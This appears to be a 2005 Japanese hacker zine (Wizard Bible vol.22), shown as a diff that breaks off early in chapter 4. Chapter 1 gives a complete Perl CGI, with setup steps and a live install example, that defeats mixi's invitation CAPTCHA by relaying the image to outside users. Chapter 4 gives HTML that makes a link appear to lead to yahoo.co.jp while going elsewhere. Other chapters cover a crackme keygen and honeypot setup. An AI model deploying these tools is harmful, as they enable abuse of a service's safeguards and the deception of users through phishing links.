@@ -1,0 +1,3112 @@
+[-]=======================================================================[-]
+
+                      Wizard Bible vol.22 (2005,10,31)
+
+[-]=======================================================================[-]
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+  ---- 第0章：目次 ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+○第1章：mixiの招待プログラムなんか簡単に作れるぜ            Zer0real 著
+
+○第2章：Crackme Kracking 0x3                                    Will 著
+
+○第3章：ハニーポットを作ろう（連載第6回）                   Narusase 著
+
+○第4章：悪戯ツールの作り方                                       PSY 著
+
+○第5章：えちぃげーむのCD・DVDチェックの外し方               右サイド 著
+
+○第6章：割り込みプログラム [前編]                            Defolos 著
+
+○第7章：自前でDLLをプロセスへマッピングさせる方法
+                                ～LoadLibrary関数の作成～  Kenji Aiko 著
+
+○第8章：企業内過剰防衛マニュアル                            IPUSIRON 著
+
+○第9章：お知らせ
+
+○第10章：著者プロフィール
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第1章: mixiの招待プログラムなんか簡単に作れるぜ ---
+
+著者：Zer0real
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) オープニング
+
+　よぉ！　久しぶりだな。前回mixiハクりネタを書いたZer0realだ。なんか前回
+のやつがやけにウケたらしいから、また似たようなの書いてくれだとよ。あのな
+ぁ、お前らなぁ、プロなめてんのか？　こんな一円の得にもならないことをなん
+で俺がやらなきゃならねーんだよ。まぁIPUSIRONには最近ちょっとしたことで世
+話になったから、今回だけは特別に無料で書いてやるけどな。今回だけな。それ
+で、今日は何するかって？　まぁちゃっちゃとmixiの招待プログラムでも作って
+やるよ。
+
+
+■0x02.) 招待の流れ
+
+　なんかちょっと前になんとかっていうやつがmixiの自動招待プログラムとかを
+mixi内で公開して、アカ剥奪くらいそうになってたよな（藁）。バグ報告コミュ
+ニティにその内容が書かれたときは笑ったよ。それで、その後、招待を行うペー
+ジに数字入力の認証が追加されたわけだが、あの対処法はぶっちゃけていうと「
+mixiのプログラマがいかに低脳であるか」を証明しただけだったわけだ。
+
+　なぜかって？　当たり前じゃねーか。あんな画像の数字認証つけたところで、
+何の意味があるっていうんだ（藁）。mixiのプログラマはマジでアフォなのか？
+もし万が一これ読んでたら悪いことは言わないから「プログラマ止めろよ」とい
+いたいね。まぁこっちとしては低脳なプログラマが増えたらそのぶん仕事がやり
+やすくなるわけだが。
+
+　さて、話を戻そうか。
+　まず、招待するしないを扱っているプログラムはinvite.plだ。つまり「http:
+//mixi.jp/invite.pl」だな。これに普通に「GET」でアクセスすると、メールア
+ドレスを入力するところと、次の画面へというボタンが表示される。ここにまず
+は招待メールを送るメールアドレスを入力するわけだ。
+
+http://ruffnex.oc.to/zer0/1.jpg
+
+　次は名前、メッセージ、そして番号を入力する場所が出てくる。
+
+http://ruffnex.oc.to/zer0/2.jpg
+
+　さて、メッセージは任意だから無視するとして、名前と番号は絶対に入れなけ
+ればならない。以前の招待ページならば番号というのはなかったからあとは名前
+を入れて送信すればそれでOKだったわけだ。実に簡単だ。しかし、mixiプログラ
+マはそれに対応して番号を導入した。こうすることで彼らは「招待プログラムな
+んてもう作れないだろう」と思ったわけだ。確かに、このランダムに生成される
+数値の画像は予測することができないため、一見問題ないように見える。しかし、
+それは大きな誤りだ。
+
+
+■0x03.) 突破口を考える
+
+　いいか、確かに画像の数値はランダムだ。これを予測することはできない。し
+かし、画像を読み込むことはできるんだ。例えばmixiのアカウントを持ってなく
+てもmixiサーバにある画像を読み込むことはできるんだよ。
+
+http://img.mixi.jp/photo/member/63/19/1756319_4173093596.jpg
+
+　さて、これはもちろんランダムに生成される画像にも適応される。つまり、画
+像はに表示される数値はランダムだが、画像自体は誰でも見ることができるわけ
+だ。
+
+　さて、それで俺が考えたプログラムはこうだ。
+　まず、mixiアカウントを欲しがっているユーザにメールアドレスを入力させる。
+そして、そのメールアドレスをinvite.plへ渡す。すると、2番目の入力ページが
+返される。その入力ページには「名前」「番号」「メッセージ」を入力する欄が
+あり、そして数値が表示された画像があるわけだ。その画像のアドレスを取得し
+て、こちら側のCGIにて表示させる。
+
+　その時点でアカウントを欲しがっているユーザには数値が表示されている画像
+が見えているわけだ。よって、それを入力してもらう。あとは、CGIが仲介となっ
+て、その入力された数値をinvite.plへ渡せば、アカウントの発行は行われるわけ
+だ。
+
+　これは説明すると意外に分かりにくい。よってソースコードを見てくれ。
+
+【編注】この考え方はmixi以外でも通用する。覚えておくと意外な場面でも活用
+できるだろう。
+
+
+■0x04.) ソースコード
+
+　以下、全ソースコードだ。
+
+-----  mixi.cgi
+#!/usr/bin/perl
+
+use Socket;
+
+$g_cookiefile = 'cookie.cgi';
+
+$g_connection = 'Keep-Alive';
+$g_u_agent    = 'Mozilla/5.0 (X11; U; Linux i686; ja-JP; rv:0.9.8+)';
+$g_host       = 'mixi.jp';
+$g_referer    = 'http://mixi.jp/';
+
+$g_html_head  = << 'HTML_HEAD';
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html lang="ja-JP">
+<head><meta http-equiv="Content-Type" content="text/html;charset=EUC-JP">
+<title>MIXI ACCOUNT GET PROGRAM</title></head>
+<body><p>ruffnex.oc.to</p>
+<div align="center"><h2>MIXI ACCOUNT GET PROGRAM</h2>
+HTML_HEAD
+
+$g_html_ftta  = << 'HTML_FTTA';
+</div></body>
+</html>
+HTML_FTTA
+
+&main_function;
+exit;
+
+sub main_function
+{
+    print "Content-Type: text/html\r\n\r\n";
+    &step3 if($ENV{'REQUEST_METHOD'} eq "POST");
+    &step2 if($ENV{'QUERY_STRING'} ne "");
+    &step1;
+}
+
+sub step1
+{
+    print $g_html_head;
+    print '<p>Input your mail address.</p>'. "\r\n";
+    print '<form action="mixi.cgi" method="get">'. "\r\n";
+    print '<input type="text" name="email" size="50">'. "\r\n";
+    print '<input type="submit" value="NEXT"></form>'. "\r\n";
+    print $g_html_ftta;
+    exit;
+
+}
+
+sub step2
+{
+    my ($key, $val) = split(/=/, $ENV{'QUERY_STRING'});
+    &step1 if($key ne "email");
+    my $mail = url_encode_decode($val, "decode");
+    my $cookie = &login_mixi("test\@test.com", "passwd");
+    &pg_error("step2 -> login_mixi") if($cookie == -1);
+    put_cookie($g_cookiefile, $cookie);
+
+    my ($pst_data, $pst_len);
+    $pst_data  = 'submit='. url_encode_decode("main", "encode"). '&';
+    $pst_data .= 'email='.  url_encode_decode($mail, "encode");
+    $pst_len   = length($pst_data);
+
+    my $content_data;
+    $content_data  = 'POST /invite.pl HTTP/1.1'.        "\r\n";
+    $content_data .= 'Connection: '.     $g_connection. "\r\n";
+    $content_data .= 'Cookie: '.         $cookie.       "\r\n";
+    $content_data .= 'User-Agent: '.     $g_u_agent.    "\r\n";
+    $content_data .= 'Host: '.           $g_host.       "\r\n";
+    $content_data .= 'Referer: '.        $g_referer.    "\r\n";
+    $content_data .= 'Content-length: '. $pst_len.      "\r\n";
+    $content_data .= "\r\n";
+    $content_data .= $pst_data;
+
+    &pg_error if( &connect_server("mixi.jp") == -1 );
+    print SOCKET $content_data;
+    my @rev_data = <SOCKET>;
+    close(SOCKET);
+
+    my $inv = "no", $pst = "no";
+    foreach(@rev_data){
+        $inv = $1 if(m/(invite_key.value=.[0-9a-f]+)/);
+        $pst = $1 if(m/(post_key.value=.[0-9a-f]+)/);
+    }
+    &pg_error("step2 -> not found invite_key") if($inv eq "no");
+    &pg_error("step2 -> not found post_key") if($pst eq "no");
+
+    my $invite_key = substr($inv, 18);
+    my $post_key   = substr($pst, 16);
+
+    print $g_html_head;
+    print '<p>Input the number below.</p>'. "\r\n";
+    print '<img src="http://mixi.jp/data/gif/'. $invite_key. '.gif" vspace=5>'. "\r\n";
+    print '<form action="mixi.cgi" method="post">'. "\r\n";
+    print '<input type="hidden" name="invite_key" value="'. $invite_key. '">'. "\r\n";
+    print '<input type="hidden" name="post_key" value="'. $post_key. '">'. "\r\n";
+    print '<input type="hidden" name="email" value="'. $mail. '">'. "\r\n";
+    print '<input type="text" name="num" size="10">'. "\r\n";
+    print '<input type="submit" value="SEND"></form>'. "\r\n";
+    print $g_html_ftta;
+    exit;
+}
+
+sub step3
+{
+    my %dd = &postdata_to_hash;
+
+    my ($pst_data, $pst_len);
+    $pst_data  = 'submit='.    url_encode_decode("non_member", "encode").   '&';
+    $pst_data .= 'email='.     url_encode_decode($dd{'email'}, "encode").   '&';
+    $pst_data .= 'last_name='. url_encode_decode("Hello", "encode").        '&';
+    $pst_data .= 'first_name='.url_encode_decode("Mixi", "encode").         '&';
+    $pst_data .= 'number='.    url_encode_decode($dd{'num'}, "encode").     '&';
+    $pst_data .= 'post_key='.  url_encode_decode($dd{'post_key'}, "encode").'&';
+    $pst_data .= 'invite_key='.url_encode_decode($dd{'invite_key'}, "encode");
+    $pst_len   = length($pst_data);
+
+    my $cookie = &get_cookie($g_cookiefile);
+    &pg_error("step3 -> get_cookie") if($cookie == -1);
+
+    my $content_data;
+    $content_data  = 'POST /invite.pl HTTP/1.1'.        "\r\n";
+    $content_data .= 'Connection: '.     $g_connection. "\r\n";
+    $content_data .= 'Cookie: '.         $cookie.       "\r\n";
+    $content_data .= 'User-Agent: '.     $g_u_agent.    "\r\n";
+    $content_data .= 'Host: '.           $g_host.       "\r\n";
+    $content_data .= 'Referer: '.        $g_referer.    "\r\n";
+    $content_data .= 'Content-length: '. $pst_len.      "\r\n";
+    $content_data .= "\r\n";
+    $content_data .= $pst_data;
+
+    &pg_error if(&connect_server("mixi.jp") == -1);
+    print SOCKET $content_data;
+    my @rev_data = <SOCKET>;
+    close(SOCKET);
+
+    my $flag = 0;
+    foreach(@rev_data){
+        $flag = 1 if(m/(mail_send\.gif)/);
+    }
+
+    print $g_html_head;
+    if($flag == 1){ print '<p>I sent mail to your address.</p>'; }
+    else          { print '<p>Sorry! I do not sent mail to your address.</p>'; }
+    print $g_html_ftta;
+    exit;
+}
+
+sub login_mixi
+{
+    my $login_email = $_[0], $login_passwd = $_[1];
+
+    my ($pst_data, $pst_len);
+    $pst_data   = 'next_url='. url_encode_decode("/home.pl", "encode").    '&';
+    $pst_data  .= 'email='.    url_encode_decode($login_email, "encode").  '&';
+    $pst_data  .= 'password='. url_encode_decode($login_passwd, "encode"). '&';
+    $pst_data  .= 'sticky=0';
+    $pst_len    = length($pst_data);
+
+    my $content_data;
+    $content_data  = 'POST /login.pl HTTP/1.1'.         "\r\n";
+    $content_data .= 'Connection: '.     $g_connection. "\r\n";
+    $content_data .= 'User-Agent: '.     $g_u_agent.    "\r\n";
+    $content_data .= 'Host: '.           $g_host.       "\r\n";
+    $content_data .= 'Referer: '.        $g_referer.    "\r\n";
+    $content_data .= 'Content-length: '. $pst_len.      "\r\n";
+    $content_data .= "\r\n";
+    $content_data .= $pst_data;
+
+    return -1 if( &connect_server("mixi.jp") == -1 );
+    print SOCKET $content_data;
+    my @rev_data = <SOCKET>;
+    close(SOCKET);
+
+    my ($bf_stamp, $bf_session, $cookie);
+    foreach(@rev_data){
+        $bf_stamp   = $1 if(m/(BF_STAMP=[0-9A-Za-z_]+)/);
+        $bf_session = $1 if(m/(BF_SESSION=[0-9A-Za-z_]+)/);
+        m/^\r\n$/ and last;
+    }
+
+    $cookie = $bf_stamp. ';'. $bf_session. ';';
+    return($cookie);
+}
+
+sub postdata_to_hash
+{
+    my $line;
+    read(STDIN, $line, $ENV{'CONTENT_LENGTH'});
+    my @data = split(/&/, $line);
+    my (%decode_data, $key, $val);
+    foreach(@data){
+        ($key, $val) = split(/=/, $_);
+        $val = &url_encode_decode($val, "decode");
+        $decode_data{$key} = $val;
+    }
+    return %decode_data;
+}
+
+sub url_encode_decode 
+{
+    my $url_str = $_[0], $url_flag = $_[1];
+    if($url_flag eq "encode"){
+        $url_str =~ s/([^\w ])/'%'. unpack('H2', $1)/eg;
+        $url_str =~ tr/ /+/;
+    }
+    if($url_flag eq "decode"){
+        $url_str =~ tr/+/ /;
+        $url_str =~ s/%([0-9A-Fa-f][0-9A-Fa-f])/pack('H2', $1)/eg;
+    }
+    return($url_str);
+}
+
+sub connect_server 
+{
+    my $host = $_[0];
+    my $port = getservbyname('http', 'tcp');
+    my $iaddr = inet_aton($host) or return -1;
+    my $sock_addr = pack_sockaddr_in($port, $iaddr);
+    socket(SOCKET, PF_INET, SOCK_STREAM, 0) or return -1;
+    connect(SOCKET, $sock_addr) or return -1;
+    select(SOCKET); $|=1; select(STDOUT);
+    return 0;
+}
+
+sub get_cookie
+{
+    my $file = $_[0];
+    open(FILE, $file) or return -1;
+    flock(FILE, 2);
+    my @data = <FILE>;
+    close(FILE);
+    chomp($data[0]);
+    return ($data[0]);
+}
+
+sub put_cookie
+{
+    my $cookie_file = $_[0], $cookie_data = $_[1];
+    open(FILE, ">$cookie_file") or return -1;
+    flock(FILE, 2);
+    print FILE "$cookie_data\n";
+    close(FILE);
+}
+
+sub pg_error
+{
+    my $error_str = $_[0];
+    print $g_html_head;
+    print '<p>Error: '. $error_str. '</p>'. "\r\n";
+    print $g_html_ftta;
+    exit;
+}
+-----
+
+　同じディレクトリにcookie.cgiというファイルを666で作成する。そして、mix
+i.cgiを701や705とかに設定してmixi.cgiにアクセスすればOKだ。
+
+
+■0x05.) 設置例
+
+　設置例はこれだ。
+
+http://ruffnex.oc.to/zer0/mixi.cgi
+
+　最後に「I sent mail to your address.」と表示されたら無事メールが送信さ
+れているというわけだ。まぁ、こんな感じだな。
+
+
+■0x06.) エンディング
+
+　さて、どこぞのオークションではmixiアカウントがいくらかで売れるらしいが、
+せこい商売してるやつもいるもんだな。かと思えば大した知識もなく番号認証な
+んてつけやがるアフォグラマもいるわけか。まぁ別に俺としてはどれだけアフォ
+なやつがいようが知ったこっちゃないがね。ただ、低脳にもほどがあるってのは、
+これを読んでる読者なら分かるだろ。どんな人間だろうとサルやチンパンジー相
+手に政治や経済について議論したいとは思わないぜ。俺のいいたいことはつまり
+そういうことだ。年齢や地位や名誉や財力などに関係なく、やっぱ世の中には低
+脳なやつがたくさんいるというわけだよ。そして、もし、そういうやつらをから
+かうのがお好きってんなら、コンピュータハッカーになることをお勧めするよ。
+なんたって、たった一回のひらめきで、そういう連中の化けの皮を剥ぎ落とすこ
+とができるんだからな。
+
+　「Knowledge is power.」
+
+　知識ってのは力なんだぜ。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第2章: Crackme Kracking 0x3 ---
+
+著者：Will
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) crackmeとは
+
+　crakemeとは、簡単にいえば解析の練習用のソフトのことです。今回は私が自作
+したcrackmeを用いて解析の勉強をしていってもらいたいと思います。
+
+
+■0x02.) 用意
+
+○使用ソフト：
+・Reflector for .NET
+http://www.aisto.com/roeder/dotnet/
+
+・Niblheim Niflheim: Reflector.NET String
+http://will.wbjapan.com/archive/programming/software/Reflector.NETString.zip
+
+○ターゲット
+・Niblheim Niflheim: 自作crackme
+http://will.wbjapan.com/archive/crackme/crackme0xc.zip
+
+○かる～いやる気
+
+○C#の知識
+
+
+■0x03.) 解析開始
+
+　まず上記のURLからcrackmeをダウンロードして普通に起動します。起動すると
+名前とパスワードを入力するTextBoxがあるのがわかります。それではReflector
+ for .NETを起動してcrackmeを開きます。すると、crackme0xc、MD5などのクラス
+があるので、crackme0xcの方を開いていくと、crackme0xc.crackme_Formの変数や
+関数が見えます。その中に「crackme0xc.crackme_Form.OK_button_Click(Object
+, EventArgs) : Void」というボタンを押したときに発生する処理が見つかります。
+コードは次のようになっています。
+
+-----
+private void OK_button_Click(object sender, EventArgs e)
+{
+      if ((this.name_textBox.Text.Length > 0) && (this.pass_textBox.Text.Length > 0))
+      {
+            if (this.pass_textBox.Text == this.passCheck(this.name_textBox.Text))
+            {
+                  MessageBox.Show("OK\u3067\u3059", "\u6b63\u898f\u306e\u30d1\u30b9");
+            }
+            else
+            {
+                  MessageBox.Show("\u4e0d\u6b63\u306a\u30d1\u30b9\u3067\u3059", "\u4e0d\u6b63\u306a\u30d1\u30b9");
+            }
+      }
+      else
+      {
+            MessageBox.Show("\u5165\u529b\u3055\u308c\u3066\u3044\u306a\u3044\u9805\u76ee\u304c\u3042\u308a\u307e\u3059", "Error");
+      }
+}
+-----
+
+　MessageBoxの文字列がユニコードが直接表示されているのでReflector.NET St
+ringで変換します。変換する場合は「"」から「"」までをTextBoxに入力してOKを
+押すと文字列が表示されます。調べてみると次のようになってます。
+
+-----
+MessageBox.Show("OK\u3067\u3059", "\u6b63\u898f\u306e\u30d1\u30b9");
+-----
+
+　これが「OKです」と表示するのがわかります。そして、その前のコードを見る
+とpass_textBoxの文字列とname_textBoxの文字列を引数にした関数の戻り値が等
+しかったら表示されるようです。そこで、passCheck関数の中身はこうなっていま
+す。
+
+-----
+private string passCheck(string pass_Text)
+{
+      string text1;
+      byte[] buffer1 = Encoding.GetEncoding(0x3a4).GetBytes(pass_Text);
+      long num1 = 0;
+      try
+      {
+            for (int num2 = 0; num2 < buffer1.Length; num2++)
+            {
+                  num1 = buffer1[num2];
+                  num1 *= buffer1[num2];
+            }
+            ConvertMD5.ToConvertMD5(num1.ToString());
+            text1 = ConvertMD5.ToConvertMD5(num1.ToString());
+      }
+      catch
+      {
+            MessageBox.Show("\u540d\u524d\u306e\u6587\u5b57\u5217\u304c\u9577\u3059\u304e\u307e\u3059");
+            text1 = null;
+      }
+      return text1;
+}
+-----
+
+　中の処理はこんな感じになってます。
+
+1：name_textBoxの文字列をbyteの配列に変換
+2：num1に配列を順に足して、かけたものが入る
+3：num1のMD5ハッシュ値を戻り値として返す
+
+　Keygenを作る場合は上の様な関数を作るか、Reflector.NETが吐いたコードを再
+利用するかの2通りありますが、基本的にはReflector.NETが吐いたコードを再利
+用する方が早いです。もちろん「using」で必要な名前空間を宣言する必要があり
+ます。
+
+
+■0x04.) 終わりに
+
+　今回もとても簡単でした。恐らくちょっと前に作成したcrackme0xbの方が面白
+いと思います。
+
+http://will.wbjapan.com/archive/crackme/crackme0xb.zip
+
+　興味がある方はこちらも解析してみてください。
+　それでは。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第3章: ハニーポットを作ろう（連載第6回） ---
+
+著者：Narusase
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　前回は、honeydの起動方法とその基本的なオプションに関して説明しました。
+そして、未使用のアドレスを監視させようとしてもうまく動作する場合と動作し
+ない場合があるという問題が発生することを述べました。
+　そこで、今回はその問題に対してどう対処するのかについて書いていきたいと
+思います。
+
+
+■0x02.) 問題のおさらい
+
+　まずは前回のおさらいです。
+　前回は192.168.1.3のIPアドレスについてhoneydで監視をしたところ、アクセス
+に反応がない状態になりました。さて、この問題はなぜ起きたのでしょうか？
+
+　実はこの問題はARPによるアドレスの解決ができないために起こった問題です。
+元来、LAN内部にあるIPアドレスに対してアクセスする場合は対象のIPアドレスに
+対応するMACアドレスを知っている必要があります。逆にLAN外部にアクセスする
+場合は、ゲートウェイのMACアドレスを知っている必要があり、どちらの場合でも
+IPアドレスとMACアドレスは切っても切れない関係にあります。
+
+　しかし、honeydを動かしているPCは自分のIPアドレスやhoneydでEthernetに関
+する設定がされているIPアドレスに対するARPのリクエストにしか反応しません。
+このため、192.168.1.3に対するARPに何らかの手段で返答を返さなければ、通信
+を行うことができません。そこで必要となるのがarpdです。
+
+
+■0x03.) arpd
+
+　arpdを簡単に説明すると、指定されたアドレスの範囲に対するARPリクエストを
+受信し、ARPリクエストの送信先に対して自らもARPリクエストを送信します。そ
+の後、ある一定時間待った後、自らが送信したARPリクエストに対する返答がない
+場合、代わりにARPレスポンスを返答するものです。
+　つまり、ARP Spoofingに似た手法を用いて特定のIPアドレスに対する通信を誘
+導するためのソフトです。ARP Spoofingと異なる部分は、起動状態のIPアドレス
+に対する通信を誘導しない点と、停止状態あるいは不在のIPアドレスに対する通
+信を誘導する点です。
+　したがって、arpdを用いることで個別にEthernetに関する設定がされていない
+IPアドレスに対しての通信に反応しない問題を解決できます。
+
+　ここで、Etherの設定をしてしまえばいいという考え方もありますが、LANの同
+一セグメントから不正アクセスが起こるということは通常は多くないと考えられ
+ます。そこで、わざわざhoneydにこれらのアドレスに対してMACアドレスを生成さ
+せ、ARPなどに対して反応させるよりは、単にarpdを用いてひとつのMACアドレス
+を教える方が効率的なのです。また、ひとつひとつMACアドレスを生成する場合は
+起動中のIPアドレスに対する動的な監視は不可能です。そのため、動的な監視を
+行うためにarpdが利用されます。
+
+
+■0x04.) arpdの実行
+
+　arpdのインストールは第4回で既に終わっているはずなので、インストールにつ
+いては割愛します。また、特に設定などは必要有りませんので設定はとばして、
+実行方法とオプションについて説明します。
+
+　arpdを実行するには下記のようなコマンドを実行します。
+
+------------
+arpd -d -i eth0 192.168.1.3
+------------
+
+　-dオプションはデーモン化せずに実行することを意味します。また、このオプ
+ションを付けた場合、詳細なデバッグメッセージが有効になります。よって、実
+際の運用時には使用しないオプションで、どちらかといえば構築中のちょっとし
+た実験や、バグの原因解明などのために使うオプションといえます。
+　-iオプションはどのインターフェースで通信を待ち受けるかを指定します。複
+数のインターフェースがある場合にどちらのインターフェースを監視するか指定
+するためのものです。
+　最後のIPアドレスはARPを返答するネットワークアドレスやホストアドレスを意
+味します。実際にはホストアドレス（「192.168.1.1」という書式）に加えてネッ
+トワーク単位（「192.168.1.1/24」という書式）、ある一定の範囲（「192.168.
+1.10-192.168.1.20」という書式）が指定できます。
+
+　arpdのオプションは以上です。
+
+
+■0x05.) 再実験
+
+　では、前回失敗した192.168.1.3へのポートスキャンをarpdを使って再度行って
+みましょう。
+
+　まず、設定ファイルから確認します。設定ファイル（「config.ethernet」ファ
+イル）は次のようになっています。ただし、解説のために左に行番号を振ってい
+ます。
+
+------------
+01 create default
+02 set default default tcp action block
+03 set default default udp action block
+04 set default default icmp action open
+05
+06 create template
+07 set template ethernet "3com"
+08 set template personality "Linux 2.4.7 (X86)"
+09
+10 bind 192.168.1.2 template
+11 bind 192.168.1.3 default
+------------
+
+
+■0x06.) honeydとarpdの実行
+
+　コンソールまたはSSHの仮想コンソールを2つ用意し、それぞれ次のようなコマ
+ンドを実行します。コンソール2で実行しているexportコマンドは必要な環境変数
+の設定のために行っていますが、bashrcなどに登録しておいてもかまいません。
+
+-----　コンソール1
+honeyd -d -f config.ethernet -i eth0 -u 1000 -g 32767 192.168.1.1-192.168.1.2
+-----
+
+-----　コンソール2
+export LD_LIBRARY_PATH=/usr/local/lib/
+arpd -d -i eth0 192.168.1.3
+-----
+
+　実際に動作していることを確認するため、LAN内の他のマシンから192.168.1.3
+に対してnmapを実行します。
+
+　ここでは時間がかかるためポート1～200まで限定してポートスキャンを実行し
+ます。
+
+-----
+[root@localhost root]# nmap -sT 192.168.1.3 -p 1-200
+
+Starting nmap 3.81 ( http://www.insecure.org/nmap/ ) at 2005-09-12 10:00 JST
+All 200 scanned ports on 192.168.1.3 are: filtered
+MAC Address: 00:04:5F:11:22:33 (Evalue Technology)
+
+Nmap finished: 1 IP address (1 host up) scanned in 15.823 seconds
+-----
+
+　確かに192.168.1.3に対してアクセスができることが確認できました。また、ポ
+ート1～200までは何もサービスが起動していないことが解り、192.168.1.1と同じ
+MACアドレスを持っていることが解ります。
+　これで、問題は解決ですね（笑。
+
+
+■0x07.) 発展
+
+　さて、ここで問題を出題します。
+　3台以上のPCを所持している方は設定ファイルの11行目のIPアドレスをハニーポ
+ットでも、ポートスキャンを行うPCでもない、3台目のPCと同一のIPを指定してく
+ださい。そして、honeydとarpdを起動して、3台目のPCが停止している状態と起動
+している状態とで違いを確認してみてください。動的に監視ができていることが
+わかると思います。
+
+　「俺は実験しなくても頭の中だけで確認できる」とか「実験機材がないので確
+認できない」という方はそれでもかまいません（笑。
+
+　実際に、動的な監視ができていることが確認できたら、その手順を頭の中で追
+うなり、Etherealでパケットを眺めるなどしてみて、なぜそうなるのかについて
+説明してください。ARPの正しい知識が有ればきっと、「ああ！こうなってるのか
+！」と納得できるはずです。
+
+　解答については、次回に説明したいと思います。
+　正解者には抽選で豪華特典をプレゼントしますので、住所、氏名、年齢をお書
+きのうえ、下記のメールアドレスへどしどしご投稿ください。なお、正解者の発
+表は本誌上にて行い、プレゼントの当選者は発送をもって発表に返させていただ
+きます。
+
+メールアドレス：narusase@mcn.ne.jp
+
+…と書いたら、本当に送ってくれるのかな？
+
+
+■0x08.) まとめ
+
+　今回はarpdの実行方法とその原理に関して述べ、honeydと連携させることで動
+的な監視が可能になることを説明しました。また、発展としてちょっとした問題
+を出題してみました。
+　次回は、問題の解答と、honeydのより詳しい使い方について説明していきたい
+と思います。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第4章: 悪戯ツールの作り方 ---
+
+著者：PSY
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) プロローグ
+
+　昔、海外のハッカーグループが、マスコミをからかって遊んだそうです。「こ
+のサイト、ハクったぜぃ」とかいいながら、自分の作った偽サイトを行ったり来
+たり。URLを見ればおかしいことに気づいたはずですが、当時のマスコミはまるで
+初心者。最終的に、パソコンに詳しい人が事態に気づき、この映像は放映されな
+かったそうですが、なかなか面白い話だと思いました。
+　自分専用WEBブラウザを作ったらどうだろう？　URLの欄を自由に設定できるよ
+うにしたら、大手サイトをハックしたように見せかけて、友達をビックリさせる
+ことだって簡単にできるじゃないか、と。
+　実は、ブラウザを作る必要はありませんでした。もっと簡単な方法で、友達を
+ビックリさせることができるのです。最近フィッシング詐欺などでそうした手口
+が使われているそうなので、まずはフィッシング詐欺について解説してみようと
+思います。
+
+
+■0x01.) フィッシング詐欺の仕組み
+
+　私のところに、初めて詐欺メールが来たのは、確かかなり昔のこと。シティバ
+ンクからの英語のメールでした。「IDとパスワードが漏えいしたので、新しいパ
+スワードを設定してほしい」とあり、URLが記されていました。シティバンクなぞ
+に口座は持っていないので、これは怪しい。
+　URLの上にカーソルを持っていくと、案の定メール上表示されているのと違うU
+RLが下のバーに表示されました。これはもう詐欺だと告白しているようなもんで
+す。正直、「こんなのに引っかかるヤツいるのかなー」と思ったものです。
+　こんなのに引っかかるようでは、サイトを持っている人なら誰でも詐欺ができ
+てしまう……と思っていたら、案の定、それから少したって、日本にもマネっこ
+詐欺が上陸してきました。
+　とはいえ、IDとパスワードがわかっただけではどうしようもありません。架空
+口座、偽名義で用意したWEBサイト……と、準備は大変。バレないうちにお金を下
+ろしに行くのも一苦労です。まあ個人じゃムリでしょうから、たいていは組織的
+犯罪でしょう。
+　あ、そういえば、Yahooの偽サイトを作って問題になってた人がいましたっけ。
+一般人がヘタに悪いことに手を出すと、ろくなことになりません。
+
+　フィッシング詐欺もだんだん手が込んできて、本家と似たドメインを取ったり
+しています。
+　さらにたちの悪いことに、下のステータスバーに表示されるURLも偽装されて
+いたりします。たとえば、次の部分を切り取ってテキストエディタに貼りつけ、
+test.htmlなどの名前で保存してみてください。
+
+-----　test.html
+<html><body>
+<a href="http://yahoo.co.jp">
+<table><tr><td>
+<a href="http://akademeia.info/">
+http://yahoo.co.jp
+</a>
